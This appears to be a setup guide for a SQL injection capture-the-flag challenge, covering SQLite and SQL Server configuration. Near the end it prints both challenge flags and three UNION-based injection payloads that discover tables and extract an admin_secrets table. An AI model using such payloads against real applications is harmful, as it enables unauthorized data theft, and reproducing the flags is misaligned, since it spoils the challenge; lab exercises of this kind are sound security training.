# 🗄️ Database Setup Guide

## Option 1: SQLite (Recommended for CTF)

### Why SQLite?
- ✅ **No setup required** - works out of the box
- ✅ **In-memory database** - resets on restart
- ✅ **Portable** - easy to distribute
- ✅ **Perfect for CTF challenges**

### How to Run:
```bash
# Install dependencies
npm install

# Start the challenge
npm start

# Visit http://localhost:3000
```

**That's it!** The SQLite database is created automatically in memory.

---

## Option 2: Microsoft SQL Server

### Prerequisites:
1. **SQL Server Installation** (any of these):
   - SQL Server Express (free)
   - SQL Server Developer Edition (free)
   - SQL Server on Docker
   - Azure SQL Database

### SQL Server on Docker (Easiest):
```bash
# Pull SQL Server Docker image
docker pull mcr.microsoft.com/mssql/server:2022-latest

# Run SQL Server container
docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=YourPassword123!" \
   -p 1433:1433 --name h7ctf-sqlserver \
   -d mcr.microsoft.com/mssql/server:2022-latest
```

### SQL Server Native Installation:
1. Download SQL Server Express: https://www.microsoft.com/en-us/sql-server/sql-server-downloads
2. Install with default settings
3. Enable SQL Server Authentication
4. Set SA password to: `YourPassword123!`

### Database Setup:
```sql
-- Connect to SQL Server and create database
CREATE DATABASE H7CTF_Challenge;
USE H7CTF_Challenge;

-- The application will create tables automatically
```

### Application Configuration:
1. **Install SQL Server dependencies:**
   ```bash
   npm install mssql
   ```

2. **Update server.js** to use SQL Server:
   ```javascript
   // Replace this line:
   const Database = require('./database');
   
   // With this:
   const Database = require('./database-sqlserver');
   ```

3. **Update connection settings** in `database-sqlserver.js`:
   ```javascript
   this.config = {
       user: 'sa',
       password: 'YourPassword123!',  // Your SA password
       server: 'localhost',            // Your SQL Server instance
       database: 'H7CTF_Challenge',
       options: {
           encrypt: false,
           trustServerCertificate: true
       }
   };
   ```

4. **Start the application:**
   ```bash
   npm run start:sqlserver
   ```

---

## 🔄 Database Comparison

| Feature | SQLite | SQL Server |
|---------|--------|------------|
| **Setup Complexity** | None | Moderate |
| **Memory Usage** | Low | Higher |
| **Realistic** | Good | Excellent |
| **CTF Suitable** | Perfect | Good |
| **Persistence** | In-memory | Persistent |
| **Performance** | Fast | Very Fast |

---

## 🐛 Troubleshooting

### SQLite Issues:
```bash
# If sqlite3 fails to install:
npm rebuild sqlite3
# Or:
npm install sqlite3 --build-from-source
```

### SQL Server Issues:
```bash
# Test connection:
sqlcmd -S localhost -U sa -P YourPassword123!

# Check if SQL Server is running:
# Windows:
services.msc  # Look for SQL Server services

# Docker:
docker ps  # Check if container is running
docker logs h7ctf-sqlserver  # Check container logs
```

### Common SQL Server Connection Errors:
1. **"Login failed for user 'sa'"**
   - Check SA password
   - Ensure SQL Server Authentication is enabled

2. **"Server is not available"**
   - Check if SQL Server service is running
   - Verify port 1433 is open
   - Check firewall settings

3. **"Certificate verification failed"**
   - Set `trustServerCertificate: true` in config

---

## 🎯 Challenge Differences

### SQLite Version:
- Flag: `H7CTF{W1LD_C4RD5_4R3_D4NG3R0U5_1N_5QL_1NJ3CT10N}`
- Uses `sqlite_master` for table discovery

### SQL Server Version:
- Flag: `H7CTF{W1LD_C4RD5_4R3_D4NG3R0U5_1N_5QL_S3RV3R}`
- Uses `information_schema` for table discovery
- More realistic enterprise environment

### SQL Server Specific Payloads:
```sql
-- Table discovery
%' UNION SELECT TABLE_NAME,'','','' FROM INFORMATION_SCHEMA.TABLES--

-- Column discovery  
%' UNION SELECT COLUMN_NAME,'','','' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_secrets'--

-- Extract flag
%' UNION SELECT flag,secret_key,description,'' FROM admin_secrets--
```

---

## 🚀 Quick Start Commands

### SQLite (Default):
```bash
npm install
npm start
```

### SQL Server:
```bash
# Start SQL Server (Docker)
docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=YourPassword123!" -p 1433:1433 --name h7ctf-sqlserver -d mcr.microsoft.com/mssql/server:2022-latest

# Install dependencies
npm install mssql

# Start challenge
npm run start:sqlserver
```

**Recommendation:** Start with SQLite for simplicity, then try SQL Server for a more realistic experience!